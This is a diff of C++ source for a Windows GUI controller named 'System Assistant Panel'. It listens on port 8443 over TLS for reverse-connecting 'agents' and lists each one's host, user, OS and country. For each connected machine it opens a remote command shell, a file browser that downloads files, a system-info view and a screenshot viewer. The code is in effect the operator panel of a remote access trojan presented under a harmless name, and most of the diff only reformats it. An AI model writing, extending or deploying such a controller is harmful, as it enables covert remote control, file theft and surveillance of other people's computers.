@@ -23,8 +23,7 @@ static HCERTSTORE g_store;
 static bool LoadPfx(const char* path) {
   HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
   if (f == INVALID_HANDLE_VALUE) return false;
-  DWORD sz = GetFileSize(f, NULL), n = 0;
-  BYTE* data = (BYTE*)malloc(sz);
+  DWORD sz = GetFileSize(f, NULL), n = 0; BYTE* data = (BYTE*)malloc(sz);
   if (!data) { CloseHandle(f); return false; }
   ReadFile(f, data, sz, &n, NULL); CloseHandle(f);
   CRYPT_DATA_BLOB blob = { sz, data };
@@ -42,6 +41,11 @@ static void AppendEdit(HWND ed, const char* s, size_t len) {
   SendMessageA(ed, EM_REPLACESEL, FALSE, (LPARAM)tmp);
   free(tmp);
 }
+static char* Crlf(const char* s) {
+  size_t n = strlen(s), j = 0; char* t = (char*)malloc(n * 2 + 1); if (!t) return NULL;
+  for (size_t i = 0; i < n; i++) { if (s[i] == '\n' && (i == 0 || s[i - 1] != '\r')) t[j++] = '\r'; t[j++] = s[i]; }
+  t[j] = 0; return t;
+}
 static int FindClientIndex(Client* c) {
   for (int i = 0; i < g_clientCount; i++) if (g_clients[i] == c) return i;
   return -1;
@@ -53,10 +57,8 @@ static Client* ClientAt(int idx) {
 }
 static void RefreshRow(Client* c) {
   int i = FindClientIndex(c); if (i < 0) return;
-  ListView_SetItemText(g_list, i, 0, c->host);
-  ListView_SetItemText(g_list, i, 1, c->user);
-  ListView_SetItemText(g_list, i, 2, c->os);
-  ListView_SetItemText(g_list, i, 3, c->country);
+  ListView_SetItemText(g_list, i, 0, c->host); ListView_SetItemText(g_list, i, 1, c->user);
+  ListView_SetItemText(g_list, i, 2, c->os); ListView_SetItemText(g_list, i, 3, c->country);
 }
 static void DropClient(Client* c) {
   EnterCriticalSection(&g_cs);
@@ -65,16 +67,13 @@ static void DropClient(Client* c) {
   int i = FindClientIndex(c);
   if (i >= 0) { ListView_DeleteItem(g_list, i); g_clients[i] = g_clients[--g_clientCount]; }
   for (int k = 0; k < K_COUNT; k++) if (c->wnd[k]) DestroyWindow(c->wnd[k]);
-  if (c->shotBmp) free(c->shotBmp);
-  FreeTlsCtx(&c->tls); free(c);
+  if (c->shotBmp) free(c->shotBmp); FreeTlsCtx(&c->tls); free(c);
 }
 static void Hello(Client* c, char* pl) {
   char* a = strchr(pl, '|'); if (a) { *a = 0; strncpy(c->host, pl, 255); }
-  char* b = a ? strchr(a + 1, '|') : NULL;
-  char* d = b ? strchr(b + 1, '|') : NULL;
+  char* b = a ? strchr(a + 1, '|') : NULL; char* d = b ? strchr(b + 1, '|') : NULL;
   if (d) { *d = 0; strncpy(c->country, d + 1, sizeof(c->country) - 1); }
-  if (b) { *b = 0; strncpy(c->user, a + 1, 255); strncpy(c->os, b + 1, 255); }
-  else strcpy(c->os, "Windows");
+  if (b) { *b = 0; strncpy(c->user, a + 1, 255); strncpy(c->os, b + 1, 255); } else strcpy(c->os, "Windows");
   if (!c->country[0]) strcpy(c->country, "?");
   LVITEMA it = {0}; it.mask = LVIF_TEXT | LVIF_PARAM; it.iItem = ListView_GetItemCount(g_list);
   it.lParam = (LPARAM)c; it.pszText = c->host; ListView_InsertItem(g_list, &it);
@@ -90,14 +89,11 @@ static void FillFiles(Client* c, char* pl, uint32_t plLen) {
   }
   char* line = pl; char* end = pl + plLen; int i = 0;
   while (line < end) {
-    char* nl = strchr(line, '\n'); if (!nl) break;
-    *nl = 0;
+    char* nl = strchr(line, '\n'); if (!nl) break; *nl = 0;
     char* p1 = strchr(line, '|');
     if (p1) {
-      *p1 = 0;
-      LVITEMA it = {0}; it.mask = LVIF_TEXT; it.iItem = i; it.pszText = line;
-      int idx = ListView_InsertItem(lv, &it);
-      ListView_SetItemText(lv, idx, 1, p1 + 1); i++;
+      *p1 = 0; LVITEMA it = {0}; it.mask = LVIF_TEXT; it.iItem = i; it.pszText = line;
+      int idx = ListView_InsertItem(lv, &it); ListView_SetItemText(lv, idx, 1, p1 + 1); i++;
     }
     line = nl + 1;
   }
@@ -107,11 +103,9 @@ static void SaveFile(Client* c, const char* pl, uint32_t plLen) {
   CreateDirectoryA("downloads", NULL);
   char name[MAX_PATH]; strcpy(name, c->shellPending);
   char* slash = strrchr(name, '\\'); if (!slash) slash = strrchr(name, '/');
-  if (slash) strcpy(name, slash + 1);
-  if (!name[0]) strcpy(name, "last.bin");
+  if (slash) strcpy(name, slash + 1); if (!name[0]) strcpy(name, "last.bin");
   char outPath[MAX_PATH + 16]; sprintf(outPath, "downloads\\%s", name);
-  WriteFileAll(outPath, pl, plLen);
-  MessageBoxA(c->wnd[K_FILES], outPath, "Saved", MB_ICONINFORMATION);
+  WriteFileAll(outPath, pl, plLen); MessageBoxA(c->wnd[K_FILES], outPath, "Saved", MB_ICONINFORMATION);
 }
 static DWORD WINAPI ClientThread(LPVOID p) {
   Client* c = (Client*)p;
@@ -125,10 +119,9 @@ static DWORD WINAPI ClientThread(LPVOID p) {
       case C_FS_LIST_RESP: if (c->wnd[K_FILES]) FillFiles(c, pl, plLen); break;
       case C_FS_FILE: SaveFile(c, pl, plLen); break;
       case C_SYSINFO: {
-        HWND info = GetDlgItem(c->wnd[K_INFO], 1);
-        if (info) SetWindowTextA(info, pl ? pl : "");
-        else MessageBoxA(g_main, pl ? pl : "", "SysInfo", MB_ICONINFORMATION);
-        break;
+        char* t = Crlf(pl ? pl : ""); HWND info = GetDlgItem(c->wnd[K_INFO], 1);
+        if (info) SetWindowTextA(info, t); else MessageBoxA(g_main, t, "SysInfo", MB_ICONINFORMATION);
+        free(t); break;
       }
       case C_SCREEN_IMG:
         if (c->shotBmp) free(c->shotBmp);
@@ -189,22 +182,19 @@ static void Fit(HWND h) {
 }
 static void ChildLayout(HWND h, int kind, int w, int ht) {
   if (kind == K_SHELL) {
-    MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht - 34, TRUE);
-    MoveWindow(GetDlgItem(h, IDC_SHELLIN), 4, ht - 30, w - 90, 24, TRUE);
+    MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht - 34, TRUE); MoveWindow(GetDlgItem(h, IDC_SHELLIN), 4, ht - 30, w - 90, 24, TRUE);
     MoveWindow(GetDlgItem(h, IDC_SHELLSEND), w - 82, ht - 30, 78, 24, TRUE);
   } else if (kind == K_FILES) {
-    MoveWindow(GetDlgItem(h, IDC_FPATH), 4, 4, w - 96, 24, TRUE);
-    MoveWindow(GetDlgItem(h, IDC_FREFRESH), w - 88, 4, 84, 24, TRUE);
-    MoveWindow(GetDlgItem(h, IDC_FGET), 4, ht - 28, 90, 24, TRUE);
-    MoveWindow(GetDlgItem(h, 1), 0, 32, w, ht - 66, TRUE);
+    MoveWindow(GetDlgItem(h, IDC_FPATH), 4, 4, w - 96, 24, TRUE); MoveWindow(GetDlgItem(h, IDC_FREFRESH), w - 88, 4, 84, 24, TRUE);
+    MoveWindow(GetDlgItem(h, IDC_FGET), 4, ht - 28, 90, 24, TRUE); MoveWindow(GetDlgItem(h, 1), 0, 32, w, ht - 66, TRUE);
   } else if (kind == K_INFO) MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht, TRUE);
 }
 static void ChildCommand(Client* c, int kind, HWND h, int id) {
   if (!c) return;
   if (kind == K_SHELL && id == IDC_SHELLSEND) {
     char buf[1024]; HWND in = GetDlgItem(h, IDC_SHELLIN);
-    GetWindowTextA(in, buf, sizeof(buf) - 3); SetWindowTextA(in, "");
-    strcat(buf, "\r\n"); TlsSendMsg(&c->tls, C_SHELL_DATA, buf, strlen(buf));
+    GetWindowTextA(in, buf, sizeof(buf) - 3); SetWindowTextA(in, ""); strcat(buf, "\r\n");
+    TlsSendMsg(&c->tls, C_SHELL_DATA, buf, strlen(buf));
   } else if (kind == K_FILES && id == IDC_FREFRESH) {
     char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
     TlsSendMsg(&c->tls, C_FS_LIST, p, strlen(p));
@@ -237,9 +227,7 @@ static LRESULT CALLBACK ChildProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
     case WM_SIZE: if (kind >= 0) ChildLayout(h, kind, LOWORD(lp), HIWORD(lp)); return 0;
     case WM_COMMAND: if (kind >= 0) ChildCommand(c, kind, h, LOWORD(wp)); return 0;
     case WM_PAINT: if (kind == K_SHOT) { ChildPaint(c, h); return 0; } break;
-    case WM_DESTROY:
-      if (kind >= 0) c->wnd[kind] = NULL;
-      SetWindowLongPtrA(h, GWLP_USERDATA, 0); return 0;
+    case WM_DESTROY: if (kind >= 0) c->wnd[kind] = NULL; SetWindowLongPtrA(h, GWLP_USERDATA, 0); return 0;
   }
   return DefWindowProcA(h, m, wp, lp);
 }
@@ -256,8 +244,7 @@ static void OpenShell(Client* c) {
   char title[512]; sprintf(title, "Shell - %s", c->host);
   HWND h = c->wnd[K_SHELL] = MakeChild("OAShell", title, K_SHELL, c, 720, 500);
   CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
-  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, NULL);
-  CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
+  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, NULL); CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
   Fit(h); TlsSendMsg(&c->tls, C_SHELL_START, NULL, 0);
 }
 static void OpenFiles(Client* c) {
@@ -271,24 +258,21 @@ static void OpenFiles(Client* c) {
   HWND lv = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
   ListView_SetExtendedListViewStyle(lv, LVS_EX_FULLROWSELECT);
   LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH;
-  col.pszText = (LPSTR)"Name"; col.cx = 300; ListView_InsertColumn(lv, 0, &col);
-  col.pszText = (LPSTR)"Size|Attr"; col.cx = 160; ListView_InsertColumn(lv, 1, &col);
+  col.pszText = (LPSTR)"Name"; col.cx = 300; ListView_InsertColumn(lv, 0, &col); col.pszText = (LPSTR)"Size|Attr"; col.cx = 160; ListView_InsertColumn(lv, 1, &col);
   CreateWindowExA(0, "BUTTON", "Download", WS_CHILD | WS_VISIBLE, 0, 0, 90, 24, h, (HMENU)IDC_FGET, g_inst, NULL);
   Fit(h); SendMessage(GetDlgItem(h, IDC_FREFRESH), BM_CLICK, 0, 0);
 }
 static void OpenInfo(Client* c) {
   if (!FocusChild(c, K_INFO)) {
-    char title[512]; sprintf(title, "SysInfo - %s", c->host);
-    HWND h = c->wnd[K_INFO] = MakeChild("OAInfo", title, K_INFO, c, 480, 360);
-    CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
+    char title[512]; sprintf(title, "SysInfo - %s", c->host); HWND h = c->wnd[K_INFO] = MakeChild("OAInfo", title, K_INFO, c, 620, 620);
+    CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | WS_HSCROLL | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
     Fit(h);
   }
   TlsSendMsg(&c->tls, C_SYSINFO, NULL, 0);
 }
 static void OpenShot(Client* c) {
   if (!FocusChild(c, K_SHOT)) {
-    char title[512]; sprintf(title, "Screen - %s", c->host);
-    c->wnd[K_SHOT] = MakeChild("OAShot", title, K_SHOT, c, 900, 560);
+    char title[512]; sprintf(title, "Screen - %s", c->host); c->wnd[K_SHOT] = MakeChild("OAShot", title, K_SHOT, c, 900, 560);
   }
   TlsSendMsg(&c->tls, C_SCREEN, NULL, 0);
 }
@@ -305,31 +289,27 @@ static LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
     }
     case WM_CONTEXTMENU: {
       if ((HWND)wp != g_list) break;
-      POINT pt = { GET_X_LPARAM(lp), GET_Y_LPARAM(lp) };
-      LVHITTESTINFO ht = {0}; ht.pt = pt; ScreenToClient(g_list, &ht.pt);
+      POINT pt = { GET_X_LPARAM(lp), GET_Y_LPARAM(lp) }; LVHITTESTINFO ht = {0}; ht.pt = pt; ScreenToClient(g_list, &ht.pt);
       if (ListView_HitTest(g_list, &ht) < 0) break;
       int idx = ListView_GetNextItem(g_list, -1, LVNI_SELECTED); if (idx < 0) break;
       Client* c = ClientAt(idx); if (!c) break;
       HMENU menu = CreatePopupMenu();
       for (auto& mi : kMenu) AppendMenuA(menu, mi.text ? MF_STRING : MF_SEPARATOR, mi.id, mi.text);
-      TrackPopupMenu(menu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, h, NULL);
-      DestroyMenu(menu); return 0;
+      TrackPopupMenu(menu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, h, NULL); DestroyMenu(menu); return 0;
     }
     case WM_COMMAND: {
       if (LOWORD(wp) == IDC_LISTEN) {
         if (InterlockedExchange(&g_listening, 1)) return 0;
         char port[16]; GetWindowTextA(g_port, port, sizeof(port));
-        addrinfo* ai = NULL; addrinfo hints = {0};
-        hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; hints.ai_flags = AI_PASSIVE;
+        addrinfo* ai = NULL; addrinfo hints = {0}; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; hints.ai_flags = AI_PASSIVE;
         getaddrinfo(NULL, *port ? port : "8443", &hints, &ai);
-        g_listenSock = socket(AF_INET, SOCK_STREAM, 0);
-        int one = 1; setsockopt(g_listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));
+        g_listenSock = socket(AF_INET, SOCK_STREAM, 0); int one = 1;
+        setsockopt(g_listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));
         if (bind(g_listenSock, ai ? ai->ai_addr : NULL, (int)(ai ? ai->ai_addrlen : sizeof(sockaddr_in))) || listen(g_listenSock, 16)) {
-          MessageBoxA(h, "bind/listen failed", "Error", MB_ICONERROR);
-          closesocket(g_listenSock); InterlockedExchange(&g_listening, 0); return 0;
+          MessageBoxA(h, "bind/listen failed", "Error", MB_ICONERROR); closesocket(g_listenSock);
+          InterlockedExchange(&g_listening, 0); return 0;
         }
-        if (ai) freeaddrinfo(ai);
-        CreateThread(NULL, 0, AcceptThread, NULL, 0, NULL);
+        if (ai) freeaddrinfo(ai); CreateThread(NULL, 0, AcceptThread, NULL, 0, NULL);
         SendMessage(g_status, SB_SETTEXTA, 0, (LPARAM)"listening"); return 0;
       }
       int idx = ListView_GetNextItem(g_list, -1, LVNI_SELECTED); if (idx < 0) return 0;
@@ -353,8 +333,7 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
   if (!LoadPfx("cert.pfx")) { MessageBoxA(NULL, "Failed to load cert.pfx", "Error", MB_ICONERROR); return 1; }
   WNDCLASSA wc = {0}; wc.lpfnWndProc = MainProc; wc.hInstance = inst;
   wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
-  wc.lpszClassName = "OpenAssistPanel"; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
-  RegisterClassA(&wc);
+  wc.lpszClassName = "OpenAssistPanel"; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION); RegisterClassA(&wc);
   g_main = CreateWindowExA(0, "OpenAssistPanel", "System Assistant Panel", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 860, 480, NULL, NULL, inst, NULL);
   CreateWindowExA(0, "STATIC", "Agents connect to you.", WS_CHILD | WS_VISIBLE, 10, 8, 300, 18, g_main, NULL, inst, NULL);
   g_port = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "8443", WS_CHILD | WS_VISIBLE | ES_NUMBER, 0, 0, 60, 22, g_main, (HMENU)IDC_PORT, inst, NULL);
@@ -365,9 +344,7 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
   LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH;
   for (int i = 0; i < 4; i++) { col.pszText = (LPSTR)cols[i].t; col.cx = cols[i].cx; ListView_InsertColumn(g_list, i, &col); }
   g_status = CreateWindowExA(0, STATUSCLASSNAMEA, "idle", WS_CHILD | WS_VISIBLE, 0, 0, 800, 22, g_main, NULL, inst, NULL);
-  RECT rc; GetClientRect(g_main, &rc);
-  SendMessageA(g_main, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
-  ShowWindow(g_main, SW_SHOW);
+  RECT rc; GetClientRect(g_main, &rc); SendMessageA(g_main, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom)); ShowWindow(g_main, SW_SHOW);
   MSG msg;
   while (GetMessageA(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageA(&msg); }
   return 0;
